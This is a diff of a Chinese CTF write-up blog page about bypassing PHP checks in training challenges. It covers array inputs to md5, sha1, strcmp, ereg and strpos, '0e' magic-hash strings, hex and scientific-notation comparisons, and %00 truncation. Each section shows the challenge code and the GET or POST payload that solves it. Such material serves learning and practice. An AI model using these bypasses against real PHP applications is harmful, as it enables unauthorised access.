@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k 字
+      2.5k 字
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      14
+      35
        分钟
     </span>
   
@@ -241,7 +241,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：1 个月前
+                  本文最后更新于：1 天前
                 
               </p>
             
@@ -266,14 +266,14 @@ $content=trim(file_get_contents($flag));<span class="hljs-comment">//把文件�
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p>extract()函数</p>
-<p><img src="/2020/09/14/decode/extrct.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" srcset="/img/loading.gif" alt="extrct.png"></p>
 <p><strong>isset()函数</strong><br>isset() 函数用于检测变量是否已设置并且非 NULL。</p>
 <p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
 <p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
 <p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
 <p>Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。</p>
 <p>file_get_contents() </p>
-<p><img src="/2020/09/14/decode/file.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" srcset="/img/loading.gif" alt="file.png"></p>
 <p>变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值</p>
 <p>这里值得注意的是 <code>$shiyan</code>==<code>$content</code>,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同</p>
 <p>可以用空值的方法使二者想等即</p>
@@ -292,7 +292,7 @@ $flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;
 
 <p>题目给的注释很清楚的给出了获得flag的条件。。。</p>
 <p>先了解一下</p>
-<p><img src="/2020/09/14/decode/strcmp.png" srcset="/img/loading.gif" alt></p>
+<p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" srcset="/img/loading.gif" alt="strcmp.png"></p>
 <p>strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  即可获得flag</p>
 <p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
 <h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目说的很清楚了，二次编码绕过</p>
@@ -321,7 +321,27 @@ $_GET[id] = urldecode($_GET[id]);
 <p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecode后的<strong>$_GET[id]</strong> 复制给自己等于hackerDJ</p>
 <p>所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag</p>
 <p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
-<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><p>之前写过</p>
+<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;
+<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])
+<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;
+<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))
+<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
+<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>利用md5不能处理数组的特性绕过</p>
+<p><a href="https://www.w3school.com.cn/php/func_string_md5.asp" target="_blank" rel="noopener">md5()</a></p>
+<p>md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p>
+<div class="hljs"><pre><code class="hljs angelscript">GET:
+/?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>
+
+
+
 <h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 $flag = <span class="hljs-string">"flag"</span>;
 
@@ -347,8 +367,8 @@ $flag = <span class="hljs-string">"flag"</span>;
 <p>“^[A-Za-z0-9]$”<br>^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串</p>
 <p>“^[A-Za-z0-9]+$”<br>+号表示重复1到多次，匹配由多个数字大小字母组成的字符串</p>
 </blockquote>
-<p><img src="/2020/09/14/decode/ereg.png" srcset="/img/loading.gif" alt="ereg"></p>
-<p><img src="/2020/09/14/decode/strpos.png" srcset="/img/loading.gif" alt="strpos"></p>
+<p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" srcset="/img/loading.gif" alt="ereg.png"></p>
+<p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" srcset="/img/loading.gif" alt="strpos.png"></p>
 <p>值得注意的是这两个函数能处理的参数都是string类型</p>
 <div class="hljs"><pre><code class="hljs php">ereg只能处理字符，r如果数组，则返回的是<span class="hljs-keyword">null</span>，三个等号的时候不会进行类型转换。所以<span class="hljs-keyword">null</span>不等于<span class="hljs-keyword">false</span>。
 
@@ -357,6 +377,268 @@ strpos的参数同样不能够是数组，所以返回的依旧是<span class="h
 <p>故?password[]=可以绕过。</p>
 <p>但是还有一种为%00截断</p>
 <p><code>?password=d%00--</code></p>
+<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><div class="hljs"><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];
+is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;
+<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;
+<span class="hljs-keyword">echo</span> $flag;</code></pre></div>
+
+<p>题目说了弱类型比较绕过</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre></div>
+
+<p>首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型</p>
+<p>在判断是否大于1336时，php默认1444b是数字类型，所以大于1336</p>
+<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$flag = <span class="hljs-string">"flag"</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))
+&#123;
+   var_dump($_GET[<span class="hljs-string">'name'</span>]);
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;
+   var_dump($_GET[<span class="hljs-string">'password'</span>]);
+   var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));
+   var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));
+    
+   <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])
+		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;
+   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))
+	    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
+   <span class="hljs-keyword">else</span>
+	    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;
+&#125;
+<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>代码逻辑很简单，首先判断是否get方式传递name和password参数</p>
+<p>var_dump，输出参数类型和值</p>
+<p>之后如果通过if判断则可以拿到flag</p>
+<p>if判断的条件</p>
+<blockquote>
+<p>name和password不能相同</p>
+<p>但是sha1(name)===sha1(password)</p>
+</blockquote>
+<p>这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs angelscript">GET:
+?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>
+
+
+
+<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
+$a = @$_GET[<span class="hljs-string">'a'</span>];
+$md52 = @md5($a);
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
+<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;
+&#125; 
+<span class="hljs-keyword">else</span> &#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
+&#125;
+&#125;
+<span class="hljs-keyword">else</span>
+&#123;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
+<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
+<p>常见的payload有</p>
+<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
+<span class="hljs-number">240610708</span>
+s878926199a
+s155964671a
+s214587387a
+s214587387a
+
+
+<span class="hljs-comment">//下面是sha1()加密后 ==相等的字符串</span>
+ sha1(str)
+<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  
+<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span>
+<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span>
+<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aa3OFF9m'</span>)</span></span></code></pre></div>
+
+<p>payload:</p>
+<div class="hljs"><pre><code class="hljs routeros">GET:
+?<span class="hljs-attribute">a</span>=240610708</code></pre></div>
+
+
+
+<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">noother_says_correct</span><span class="hljs-params">($temp)</span></span>
+<span class="hljs-function"></span>&#123;
+$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
+$one = ord(<span class="hljs-string">'1'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
+$nine = ord(<span class="hljs-string">'9'</span>); <span class="hljs-comment">//ord — 返回字符的 ASCII 码值</span>
+$number = <span class="hljs-string">'3735929054'</span>;
+<span class="hljs-comment">// Check all the input characters!</span>
+<span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; strlen($number); $i++)
+&#123;
+<span class="hljs-comment">// Disallow all the digits!</span>
+$digit = ord($temp&#123;$i&#125;);
+<span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+&#123;
+<span class="hljs-comment">// Aha, digit not allowed!</span>
+<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
+&#125;
+&#125;
+<span class="hljs-keyword">if</span>($number == $temp)
+<span class="hljs-keyword">return</span> $flag;
+&#125;
+$temp = $_GET[<span class="hljs-string">'password'</span>];
+<span class="hljs-keyword">echo</span> noother_says_correct($temp);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>重点在这段代码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
+&#123;
+<span class="hljs-comment">// Aha, digit not allowed!</span>
+<span class="hljs-keyword">return</span> <span class="hljs-string">"flase"</span>;
+&#125;
+&#125;
+<span class="hljs-keyword">if</span>($number == $temp)
+<span class="hljs-keyword">return</span> $flag;
+&#125;</code></pre></div>
+
+<p>输入的数字中不能包含1-9的数字</p>
+<p>如果输入的数字和相等则拿到flag</p>
+<p>可以想到的是将这段数字转换为十六进制</p>
+<div class="hljs"><pre><code class="hljs angelscript">hex(<span class="hljs-number">3735929054</span>)=<span class="hljs-number">0xdeadc0de</span>
+
+GET:
+password=<span class="hljs-number">0xdeadc0de</span></code></pre></div>
+
+<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>网址打不开</p>
+<h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$flag = <span class="hljs-string">"xxx"</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>]))
+&#123;
+	<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)
+	&#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
+	&#125;
+	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)
+	&#123;
+		<span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//strpos — 查找字符串首次出现的位置</span>
+		&#123;
+			<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
+		&#125;
+	<span class="hljs-keyword">else</span>
+	&#123;
+		<span class="hljs-keyword">echo</span>(<span class="hljs-string">'- have not been found'</span>);
+	&#125;
+&#125;
+<span class="hljs-keyword">else</span>
+&#123;
+	<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
+&#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>绕过三个if语句即可拿到flag</p>
+<p>第一个</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>)</code></pre></div>
+
+<p>这个比较常见的正则表达式，也很容易理解</p>
+<p><code>[a-zA-Z0-9]+</code>包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志</p>
+<p>第二个</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen($_GET[<span class="hljs-string">'password'</span>]) &lt; <span class="hljs-number">8</span> &amp;&amp; $_GET[<span class="hljs-string">'password'</span>] &gt; <span class="hljs-number">9999999</span>)</code></pre></div>
+
+<p>password字段长度小于8，但是大于9999999，可以使用科学计数法</p>
+<p>第三个</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'-'</span>) !== <span class="hljs-keyword">FALSE</span>)</code></pre></div>
+
+<p>password要包含 <code>-</code>（做题的时候会发现应该是<code>*-*</code>）</p>
+<p>payload</p>
+<div class="hljs"><pre><code class="hljs angelscript">GET:
+password=<span class="hljs-number">1e9</span>%<span class="hljs-number">00</span>*-*</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/28/xcjep86YFtWgXMk.png" srcset="/img/loading.gif" alt="zhengze.png"></p>
+<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+$flag = <span class="hljs-string">"flag"</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'ctf'</span>])) &#123;
+<span class="hljs-keyword">if</span> (@ereg (<span class="hljs-string">"^[1-9]+$"</span>, $_GET[<span class="hljs-string">'ctf'</span>]) === <span class="hljs-keyword">FALSE</span>)
+<span class="hljs-keyword">echo</span> <span class="hljs-string">'必须输入数字才行'</span>;
+<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'ctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)
+<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
+<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">'骚年，继续努力吧啊~'</span>;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>直接利用ereg和strpos函数不能处理数组的特性绕过</p>
+<p>当输入ctf[]=11时，ereg返回值null!==FALSE</p>
+<p>strpos返回值也为null!=FALSE</p>
+<p>拿到flag</p>
+<p>payload：</p>
+<div class="hljs"><pre><code class="hljs angelscript">GET:
+?ctf[]=<span class="hljs-number">111</span>
+<span class="hljs-comment">//正常做法</span>
+?nctf=<span class="hljs-number">1</span>%<span class="hljs-number">00</span>%<span class="hljs-number">23</span>biubiubiu</code></pre></div>
+
+<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-string">"POST"</span> == $_SERVER[<span class="hljs-string">'REQUEST_METHOD'</span>])
+&#123;
+$password = $_POST[<span class="hljs-string">'password'</span>];
+<span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="hljs-comment">//preg_match — 执行一个正则表达式匹配 长度大于12</span>
+&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">'flag'</span>;<span class="hljs-comment">//这里输出的是假flag 真的在下面</span>
+<span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-keyword">while</span> (<span class="hljs-keyword">TRUE</span>)
+&#123;
+$reg = <span class="hljs-string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all($reg, $password, $arr))
+<span class="hljs-keyword">break</span>;
+$c = <span class="hljs-number">0</span>;
+$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
+  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
+<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
+&#123;
+<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
+$c += <span class="hljs-number">1</span>;
+&#125;
+<span class="hljs-keyword">if</span> ($c &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
+<span class="hljs-comment">//&gt;=3，必须包含四种类型三种与三种以上</span>
+<span class="hljs-keyword">if</span> (<span class="hljs-string">"42"</span> == $password) <span class="hljs-keyword">echo</span> $flag;
+<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">'Wrong password'</span>;
+<span class="hljs-keyword">exit</span>;
+&#125;
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+
+
+<p>代码还挺长，但是直接抓住重点</p>
+<div class="hljs"><pre><code class="hljs lisp">if (<span class="hljs-number">0</span> &gt;= preg_match('/^[[<span class="hljs-symbol">:graph</span>:]]&#123;<span class="hljs-number">12</span>,&#125;$/', $password))</code></pre></div>
+
+<p>[:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12</p>
+<p>下面的正则</p>
+<div class="hljs"><pre><code class="hljs php">$ps = <span class="hljs-keyword">array</span>(<span class="hljs-string">'punct'</span>, <span class="hljs-string">'digit'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'lower'</span>); 
+  <span class="hljs-comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span>
+<span class="hljs-keyword">foreach</span> ($ps <span class="hljs-keyword">as</span> $pt)
+&#123;
+<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">"/[[:$pt:]]+/"</span>, $password))
+$c += <span class="hljs-number">1</span>;
+&#125;</code></pre></div>
+
+<p>要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload</p>
+<div class="hljs"><pre><code class="hljs angelscript">POST:
+password=<span class="hljs-number">42</span>adad;d;;a
+
+<span class="hljs-comment">//非正常的</span>
+password=<span class="hljs-number">42</span>%<span class="hljs-number">00</span>
+或者POST一个任意不等于password的字符
+暂时不知道什么原因导致的</code></pre></div>
+
+<p><img src="https://i.loli.net/2020/11/28/euJc6DPKCZ4a5bY.png" srcset="/img/loading.gif" alt="shuzi2.png"></p>
+<p><img src="https://i.loli.net/2020/11/28/HwsChaXMRFWmjeA.png" srcset="/img/loading.gif" alt="shuzi1.png"></p>
+<h2 id="简单waf"><a href="#简单waf" class="headerlink" title="简单waf"></a>简单waf</h2><p>网址打不开</p>
 
             </div>
             <hr>
